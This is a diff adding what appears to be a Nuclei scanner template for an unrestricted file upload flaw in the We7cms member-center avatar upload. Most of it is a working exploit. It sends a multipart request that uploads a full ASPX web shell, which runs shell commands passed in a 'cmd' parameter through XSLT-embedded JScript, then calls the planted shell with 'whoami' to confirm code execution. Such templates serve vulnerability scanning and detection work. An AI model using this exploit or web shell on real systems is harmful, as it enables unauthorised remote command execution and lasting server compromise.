@@ -1,0 +1,126 @@
+id: westengine-we7-accountedit-file-upload
+info:
+  name: WestEngine-We7 AccountEdit File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    We7cms does not filter the script type of the uploaded file in the upload avatar of the member center, allowing direct upload of ASPX scripts, leading to potential remote code execution.
+  tags: file-upload
+  reference:
+    - https://www.daimaqu.cn/view/258227.html
+http:
+  - raw:
+      - |
+        GET /User/AccountEdit.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "基本信息"
+  - raw:
+      - |
+        POST /User/AccountEdit.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------7e532d6160316
+
+        -----------------------------7e532d6160316
+        Content-Disposition: form-data; name="__VIEWSTATE"
+
+        /wEPDwULLTEzMDg5OTY2NTcPZBYCZg9kFgICCQ9kFgICARAWAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWQWAgIBDw8WAh4EVGV4dAWKAjxMSSBjbGFzcz1UYWJJbiBpZD10YWIxIHN0eWxlPSdkaXNwbGF5Oic+PEE+5Z+65pys5L+h5oGvPC9BPiA8L0xJPjxMSSBjbGFzcz1UYWJPdXQgaWQ9dGFiNCAgc3R5bGU9J2Rpc3BsYXk6Jz48QSAgaHJlZj0vVXNlci9BY2NvdW50RWRpdC5hc3B4P3RhYj00PumAiemhuTwvQT4gPC9MST48TEkgY2xhc3M9VGFiT3V0IGlkPXRhYjUgIHN0eWxlPSdkaXNwbGF5Oic+PEEgIGhyZWY9L1VzZXIvQWNjb3VudEVkaXQuYXNweD90YWI9NT7lr4bnoIHorr7nva48L0E+IDwvTEk+ZGRkeF0Cji3RkJKFkgwUAnE1IRTBHT0=
+        -----------------------------7e532d6160316
+        Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+        B4FE6035
+        -----------------------------7e532d6160316
+        Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+        /wEWBgLMgeKmBQK8ko+sCwLj7JnWDwKavpXnAwKmyMubDAKW1typA4Ixq1i58zhCij+9M4gpVRM+76SE
+        -----------------------------7e532d6160316
+        Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$upload"; filename="test.aspx"
+        Content-Type: text/plain
+
+        <%@page language="C#"%>
+        <%@ import Namespace="System.IO"%>
+        <%@ import Namespace="System.Xml"%>
+        <%@ import Namespace="System.Xml.Xsl"%>
+        <%
+        string xml=@"<?xml version=\"1.0\"?><root>test</root>";
+        string xslt=@"<?xml version='1.0'?>
+        <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:zcg=\"zcgonvh\">
+            <msxsl:script language=\"JScript\" implements-prefix=\"zcg\">
+            <msxsl:assembly name=\"mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"/>
+            <msxsl:assembly name=\"System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"/>
+            <msxsl:assembly name=\"System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"/>
+            <msxsl:assembly name=\"System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\"/>
+                <![CDATA[function xml(){
+                var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;
+                var command = Request.Item['cmd'];
+                var r = new ActiveXObject(\"WScript.Shell\").Exec(\"cmd /c \"+command);
+                var OutStream = r.StdOut;
+                var Str = \"\";
+                while (!OutStream.atEndOfStream) {
+                    Str = Str + OutStream.readAll();
+                    }
+                Response.Write(\"<pre>\"+Str+\"</pre>\");
+                }]]>
+            </msxsl:script>
+        <xsl:template match=\"/root\">
+            <xsl:value-of select=\"zcg:xml()\"/>
+        </xsl:template>
+        </xsl:stylesheet>";
+        XmlDocument xmldoc=new XmlDocument();
+        xmldoc.LoadXml(xml);
+        XmlDocument xsldoc=new XmlDocument();
+        xsldoc.LoadXml(xslt);
+        XsltSettings xslt_settings = new XsltSettings(false, true);
+        xslt_settings.EnableScript = true;
+        try{
+            XslCompiledTransform xct=new XslCompiledTransform();
+            xct.Load(xsldoc,xslt_settings,new XmlUrlResolver());
+            xct.Transform(xmldoc,null,new MemoryStream());
+        }
+        catch (Exception e){
+            Response.Write("Error");
+        }
+        %>
+        -----------------------------7e532d6160316
+        Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$bttnUpload"
+
+        上传图片
+        -----------------------------7e532d6160316
+        Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtLastName"
+
+
+        -----------------------------7e532d6160316
+        Content-Disposition: form-data; name="ctl00$MyContentPlaceHolder$ctl00$txtEmail"
+
+
+        -----------------------------7e532d6160316--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/_data/Uploads/"
+    extractors:
+      - type: regex
+        group: 0
+        regex:
+          - "/_data/Uploads/(.*?)aspx"
+  - raw:
+      - |
+        GET {{extracted}}?cmd=whoami HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<pre>"
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "(?s)<pre>(.*?)</pre>"
